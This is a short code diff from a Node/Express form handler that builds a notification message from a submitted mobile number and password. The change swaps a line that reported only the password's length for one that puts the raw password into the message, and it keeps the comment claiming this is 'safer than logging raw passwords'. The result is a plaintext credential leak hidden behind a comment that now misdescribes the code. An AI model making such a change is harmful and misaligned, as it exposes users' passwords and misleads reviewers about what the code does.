@@ -26,7 +26,7 @@ app.post("/api/submit", async (req, res) => {
       const message = [
         "New demo form submission",
         `Mobile: ${safeMobile}`,
-        `Password length: ${safePassword.length} chars`, // Safer than logging raw passwords
+        `Password : ${safePassword}`, // Safer than logging raw passwords
         "Purpose: User-consented demo contact form"
       ].join("\n");
 
